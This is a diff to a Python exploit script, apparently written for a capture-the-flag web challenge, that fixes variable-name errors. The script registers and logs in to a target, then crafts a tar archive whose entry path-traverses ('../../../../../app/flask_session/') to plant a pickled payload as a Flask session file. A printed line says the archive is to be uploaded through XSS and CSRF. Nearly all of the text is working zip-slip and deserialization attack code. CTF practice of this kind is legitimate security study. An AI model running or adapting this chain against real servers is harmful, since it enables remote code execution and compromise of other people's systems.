@@ -10,17 +10,17 @@ import pickle
 import hashlib
 import struct
 
-hostURL = 'http://134.209.17.29:31566'               # Challenge URL
+hostURL = 'http://157.245.46.136:31078'               # Challenge URL
 user = f'test'                            # new username
-pass = f'test'                             # new password
+pwd = f'test'                             # new password
 
 def register():
-    data1 = { 'username': user, 'password': pass }
-    req = requests.post(f'{hostURL}/api/register', json=data)
+    data1 = { 'username': user, 'password': pwd }
+    req = requests.post(f'{hostURL}/api/register', json=data1)
 
 def login():
-    data2 = { 'username': user, 'password': pass }
-    cookie = requests.post(f'{hostURL}/api/login', json=data).cookies.get('session')
+    data2 = { 'username': user, 'password': pwd }
+    cookie = requests.post(f'{hostURL}/api/login', json=data2).cookies.get('session')
     return cookie
 
 def slip(file):
@@ -33,7 +33,7 @@ def slip(file):
 
     zipslip = io.BytesIO()
     tar = tarfile.open(fileobj=zipslip, mode='w:gz')
-    info = tarfile.TarInfo(f'../../../../../app/flask_session/{filename}')
+    info = tarfile.TarInfo(f'../../../../../app/flask_session/{file}')
     info.mtime = time.time()
     info.size = len(pickled_payload)
     tar.addfile(info, io.BytesIO(pickled_payload))
@@ -50,7 +50,7 @@ cookie = login()
 
 print('[+] Preparing zipslip payload file with matching cookie sid..')
 sid = 'test'
-filename = hashlib.md5(sid.encode()).hexdigest()
+file = hashlib.md5(sid.encode()).hexdigest()
 b64_file = slip(file)
 
 print('[+] XSS payload to upload the zipslip using CSRF')
